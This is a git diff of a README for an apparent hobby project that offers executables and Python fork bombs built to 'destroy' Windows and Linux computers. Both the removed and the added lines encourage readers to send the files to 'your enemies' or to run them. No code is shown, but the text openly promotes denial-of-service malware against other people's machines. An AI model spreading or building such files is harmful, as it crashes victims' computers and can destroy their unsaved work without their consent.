@@ -3,22 +3,13 @@
 We make some exe to destroy/fork bomb windows computers!
 
 ## Getting Started
-Download our files and send the files to your enemies (at the Moment i had only exe)!
+Just extract everything and execute the .exe when using the (Windiws) zip files!
 
 ### Prerequisites
 
-* Windows Vista or higher
+* --> Python_ForkBomb(linux).command --> Python 2 or higher
+* --> Python_ForkBomb(Windows).zip --> Python 2 or higher
 
-## Built With
-
-* Atom = https://atom.io
-* Compiler Software
-
-## Authors
-
-* **DevSodoku and H137
-
-* **We speak German and come from Germany but we do our best to give your Enemies good Expirience!
 
 ## Acknowledgments
 
@@ -28,3 +19,9 @@ Download our files and send the files to your enemies (at the Moment i had only 
 - Only for Windows
 + All exe without HIGH RISK in name can executed by your self! (Not yet applied so do not run on your computer)
 ```
+
+## Authors
+
+* **DevSodoku and H137
+
+* **We speak German and come from Germany but we do our best to give your Enemies good Expirience!
